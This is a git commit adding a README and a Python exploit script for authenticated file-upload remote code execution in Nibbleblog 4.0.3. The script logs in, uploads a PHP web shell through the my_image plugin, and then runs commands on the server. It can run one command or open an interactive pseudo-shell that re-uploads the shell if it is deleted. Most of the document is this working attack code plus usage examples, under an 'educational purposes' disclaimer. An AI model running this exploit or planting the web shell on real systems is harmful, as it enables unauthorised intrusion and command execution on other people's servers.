4781db26950374ad1f899dc35b8e4e36308c088f
Adrian <hadrian3689@gmail.com>
2022-04-18 21:34:31 -0400

    First commit, rce and pseudo-shell

---
+++ README.md
@@ -0,0 +1,31 @@
+# Project Title
+
+Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution (RCE)
+
+## Description
+
+A python3 script for Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution (RCE)
+
+## Getting Started
+
+### Executing program
+
+```
+* RCE
+```
+python3 nibbleblog_4.0.3.py -t http://nibblesrce.com/blog/admin.php -u admin -p password -rce whoami
+```
+* Pseudo-shell
+```
+python3 nibbleblog_4.0.3.py -t http://nibblesrce.com/blog/admin.php -u admin -p password -shell
+```
+
+## Help
+
+For help menu:
+```
+python3 nibbleblog_4.0.3.py -h
+```
+
+## Disclaimer
+All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.
---
+++ nibbleblog_4.0.3.py
@@ -0,0 +1,99 @@
+import argparse
+import requests
+
+class Nibbleblog():
+    def __init__(self,target,username,password,rce):
+        self.target = target
+        self.username = username
+        self.password = password
+        self.cmd = rce
+        self.upload()
+
+    def upload(self):
+        requests.packages.urllib3.disable_warnings()
+        payload = "<?php echo system($_REQUEST['rse']); ?>"
+        session = requests.Session()
+        login_data = {
+            'username':self.username,'password':self.password,'login':''
+        }
+        print("Loggin in to " + self.target)
+        req_url_login = session.post(self.target,data=login_data,verify=False)
+    
+        file_data = {
+            "plugin":"my_image",
+            "title":"blah",
+            "position":"4",
+            "caption":"test",
+        }
+
+        file_content = {
+            'rse':('rse.php',payload,{'Content-Type':'application/x-php'},{'Content-Disposition':'form-data'}),
+        }
+
+        url_upload = self.target + "?controller=plugins&action=config&plugin=my_image"
+        req_url_upload = session.post(url_upload,data=file_data,files=file_content,verify=False)
+        if req_url_upload.status_code == 200:
+            print("Logged in and was able to upload exploit!")
+            self.rce()
+        else:
+            print("Something went wrong with the upload!")
+            exit()
+
+    def rce(self):
+        if args.shell:
+            requests.packages.urllib3.disable_warnings()
+            url_shell = self.target.replace("/admin.php","/content/private/plugins/my_image/rse.php")
+            print("Payload located in " + url_shell)
+
+            while True:
+                req_url_file_check = requests.get(url_shell,verify=False)
+                if req_url_file_check.status_code != 200:
+                    print("File has been deleted. Re-Uploading file!")
+                    self.upload()
+                    break
+                else:
+                    cmd = input("RCE: ")
+                    
+                    rce_data = {
+                        'rse':cmd
+                    }
+                    req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
+                    if req_url_rce.status_code != 200:
+                        print("File has been deleted. Re-Uploading file!")
+                        self.upload()
+                        break
+                    else:
+                        print(req_url_rce.text)
+
+        if args.rce:
+            requests.packages.urllib3.disable_warnings()
+            url_shell = self.target.replace("/admin.php","/content/private/plugins/my_image/rse.php")
+            print("Payload located in " + url_shell)
+
+            req_url_file_check = requests.get(url_shell,verify=False)
+            if req_url_file_check.status_code != 200:
+                print("File has been deleted. Re-Uploading file!")
+                self.upload()
+            else:
+                rce_data = {
+                    'rse':self.cmd
+                }
+                req_url_rce = requests.post(url_shell,data=rce_data,verify=False)
+                print(req_url_rce.text)
+
+if __name__ == "__main__":
+    print("Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution")
+    parser = argparse.ArgumentParser(description='Nibbleblog 4.0.3 File Upload Authenticated Remote Code Execution')
+
+    parser.add_argument('-t', metavar='<Target admin URL>', help='admin target/host URL, E.G: http://nibblesrce.com/blog/admin.php', required=True)
+    parser.add_argument('-u', metavar='<user>', help='Username', required=True)
+    parser.add_argument('-p', metavar='<password>', help="Password", required=True)
+    parser.add_argument('-rce', metavar='<Remote Code Execution>', help='-rce whoami', required=False)
+    parser.add_argument('-shell',action='store_true',help='Pseudo-Shell option for continous rce', required=False)
+    args = parser.parse_args()
+
+    try:
+        Nibbleblog(args.t,args.u,args.p,args.rce)
+    except KeyboardInterrupt:
+        print("Bye Bye")
+        exit()
